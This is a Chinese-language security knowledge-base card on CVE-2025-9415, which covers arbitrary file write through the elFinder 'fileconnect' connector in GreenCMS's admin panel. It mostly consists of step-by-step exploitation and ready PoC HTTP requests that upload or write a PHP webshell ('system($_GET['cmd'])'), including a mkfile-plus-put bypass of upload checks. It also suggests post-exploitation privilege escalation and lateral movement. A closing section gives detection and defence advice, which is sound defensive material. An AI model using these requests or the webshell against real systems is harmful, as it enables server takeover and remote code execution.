---
id: web-php-rce-greencms-elfinder-fileconnect-upload-put-webshell
title: GreenCMS elFinder fileconnect 命令滥用：upload/mkfile/put 写 WebShell（CVE-2025-9415）
type: scenario
domain: web
path: web/php/rce
technique: greencms-elfinder-fileconnect-upload-put-webshell
tags:
- php
- greencms
- elfinder
- file-upload
- arbitrary-file-write
- webshell
- rce
cve:
- CVE-2025-9415
severity: critical
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V197
  verified_at: '2026-11-06T22:54:15+08:00'
  notes: 已对照原文及图01-21核对：open返回Upload hash l1_XA、upload(target=l1_XA)落地sh.php并whoami、mkdir/mkfile创建pts/11.php/12.php、put(target=l1_MTBucGhw/l1_cHRzXDEyLnBocA)写入并执行、自动化脚本均与截图一致；hash解码pts\12.php正确。原文代码块upload写成GET，截图实际为POST，卡片采用POST。原文未给GreenCMS版本，未设affected_versions；未在非授权环境执行。
url: /docs/web/php/rce/web-php-rce-greencms-elfinder-fileconnect-upload-put-webshell/
draft: false
kb_aliases:
- GreenCMS 任意文件上传
- CVE-2025-9415
- elFinder fileconnect
- cmd=upload
- cmd=put
- cmd=mkfile
- target hash l1_XA
- Upload 目录 getshell
---

## 一句话结论

GreenCMS 后台媒体管理接了 elFinder 的 `fileconnect` 连接器，`cmd` 参数直接映射到 `open/ls/mkdir/mkfile/put/upload` 等方法。登录后台后先用 `cmd=open&init=1&tree=1` 拿到 `Upload` 目录的 target hash（如 `l1_XA`），再用 multipart `cmd=upload&target=l1_XA` 上传 PHP 文件，即可在 `Upload/` 下落地 WebShell；如果 upload 的 MIME 白名单拦截 PHP，还可先用 `mkfile` 创建空 `shell.php`，再用 `put` 把 `content` 原样写入该文件，绕过上传类型校验。

## 原理

- **elFinder connector 的 cmd 分发**：`/index.php?m=admin&c=media&a=fileconnect` 是 elFinder 的连接器入口，`cmd` 选择操作，`target` 是目标文件/目录的 hash。每个命令有不同必需参数：`upload` 需要 `target` + `FILES`，`put` 需要 `target` + `content`，`mkfile` 需要 `target` + `name`，`open` 需要可选的 `target/init/tree`。
- **target hash 编码路径**：hash 形如 `l1_XA`、`l1_cHRzXDEyLnBocA`，前缀是卷 ID（`l1_`），后面是路径的 Base64（去 padding）。`l1_XA` 对应当前 Upload 根目录；`l1_cHRzXDEyLnBocA` 解码为 `pts\12.php`，因此可以精确指向子目录/文件。`open`/`ls` 的响应会返回每个目录/文件的 `hash` 与 `phash`，可直接复用。
- **upload 的检查链**：卷的 `upload()` 会检查命令是否禁用、目标目录是否存在/可写、文件名是否合法、MIME 是否在 `uploadAllow`/`uploadDeny` 规则内、大小是否超限；`_save()` 最终写文件。若配置允许 PHP 或 MIME 检测被文件名/内容绕过，就会把 PHP 写入 Web 目录。
- **mkfile + put 绕过 upload 检查**：`mkfile` 在目标目录创建空文件（示例创建 `11.php`、`12.php`），`put` 把 `content` 参数写入指定 target 文件。原文展示的 `put` 路径没有走 upload 的 MIME/扩展名检查，因此即使 upload 拒绝 `.php`，仍可先 `mkfile` 再 `put` 写入 `<?php system($_GET['cmd']); ?>`。
- **为什么能 RCE**：`Upload/` 目录位于 Web 根下且 Apache/PHP 会解析 `.php`；攻击者拥有后台会话（弱口令/默认口令/凭据复用），连接器又直接暴露文件写命令；两者叠加即 getshell。
- **CVE 范围**：原文标题标注 CVE-2025-9415 为 GreenCMS 任意文件上传；文章同时把 `ls/open/mkdir/mkfile/put` 作为同一连接器的其它可利用命令分析。CVE 具体受影响版本原文未给出，卡内不猜版本；利用前提是能登录后台并访问 `fileconnect`。

## 触发条件

- 目标为 GreenCMS（原文未标注具体版本），后台媒体管理使用 elFinder `fileconnect` 连接器。
- 攻击者拥有后台管理员会话（弱口令、默认口令、凭据复用或其它后台漏洞）。
- `Upload/` 或其它目标目录对 Web 进程可写，且 Web 服务器解析 `.php`。
- `upload` 的 MIME/扩展名规则未拦截 PHP，或 `put/mkfile` 命令未被禁用。
- 无 WAF/文件完整性保护拦截 `cmd=upload/put/mkfile`、`content` 中的 PHP 代码。

## 利用步骤

1. 登录后台，确认媒体管理页面加载 elFinder，记录 `PHPSESSID` 等认证 Cookie。
2. 获取 Upload 目录 hash：
   `GET /index.php?m=admin&c=media&a=fileconnect&cmd=open&init=1&tree=1`
   在 JSON 的 `files` 中找到 `name":"Upload"` 的 `hash`（示例 `l1_XA`）。
3. 上传 WebShell：
   `POST /index.php?m=admin&c=media&a=fileconnect`，multipart 包含 `cmd=upload`、`target=l1_XA`、`upload[]` 文件名 `sh.php`、内容 `<?php system($_GET['cmd']); ?>`。
4. 访问 `http://target/Upload/sh.php?cmd=id` 验证；若成功即 RCE。
5. 若 upload 被拦截：先用 `cmd=open&target=<目标目录hash>&init=1&tree=1` 获取子目录 hash；用 `cmd=mkfile&target=<hash>&name=shell.php` 创建空文件并拿到新文件 hash；再用 `cmd=put&target=<文件hash>&content=<?php system($_GET['cmd']);?>` 写入。
6. 也可用 `cmd=ls`、`cmd=open` 枚举目录，`cmd=mkdir` 创建目录；把 hash 解码为路径以确认落点。
7. 验证命令执行、清理上传文件；后续可结合本地提权/横向。

## PoC

最小 upload 请求（授权测试用）：

```http
POST /index.php?m=admin&c=media&a=fileconnect HTTP/1.1
Host: target
Cookie: PHPSESSID=<session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123def456

------WebKitFormBoundaryABC123def456
Content-Disposition: form-data; name="cmd"

upload
------WebKitFormBoundaryABC123def456
Content-Disposition: form-data; name="target"

l1_XA
------WebKitFormBoundaryABC123def456
Content-Disposition: form-data; name="upload[]"; filename="sh.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryABC123def456--
```

mkfile + put 绕过（替换 target hash）：

```http
GET /index.php?m=admin&c=media&a=fileconnect&cmd=mkfile&target=l1_XA&name=shell.php HTTP/1.1

GET /index.php?m=admin&c=media&a=fileconnect&cmd=put&target=<新文件hash>&content=%3C?php%20system($_GET['cmd']);?%3E HTTP/1.1
```

说明：`target` hash 来自 `open`/`ls` 响应；`l1_XA` 是示例，实际会随卷/路径变化；`content` 需 URL 编码。未在非授权环境执行。

## 变体与关联

- 变体：目标目录在子目录时，用 `open` 取得 `hash`（如 `l1_cHRzXDEy...`）再 upload/mkfile；`target` 的 Base64 可解码为路径，便于定位。
- 变体：`put` 可直接覆盖已有可写文件（如配置文件、模板），用于写入 PHP 或篡改配置。
- 变体：elFinder 的 archive/extract、rename、duplicate 等命令也可滥用；不同 connector 配置的命令白名单不同。
- 变体：其它集成 elFinder 的 CMS/框架（如文件管理器插件）若暴露 connector 且权限校验弱，可利用相同 `cmd/target` 语义。
- 关联：[[web-php-rce-cmseasy-cve-2021-42643-template-save-file-write]]（另一种后台模板写 shell）；[[web-php-rce-joomla-admin-template-editor-webshell]]（后台模板编辑写 shell）；[[web-generic-file-upload-extension-zero-check]]（上传扩展名校验缺失）。

## 检测与防御

- 检测：Web 日志中出现 `a=fileconnect` 且 `cmd=upload/put/mkfile/mkdir`，`target` 含 `l1_` 等 hash 前缀；`content` 含 `<?php`、`system`、`eval`。
- 检测：`Upload/` 目录新增 `.php` 文件，尤其是空文件随后被写入内容（mkfile+put 模式）；文件修改时间与后台会话时间吻合。
- 防御：升级 GreenCMS/elFinder 到修复版本；后台强口令/MFA；生产环境禁用或限制文件管理器 connector。
- 防御：上传目录移出 Web 根或禁止 PHP 解析；对 upload 做扩展名/MIME/内容多重校验；对 `put/mkfile` 做命令白名单与权限校验；WAF 拦截 fileconnect 的高 risk 命令。
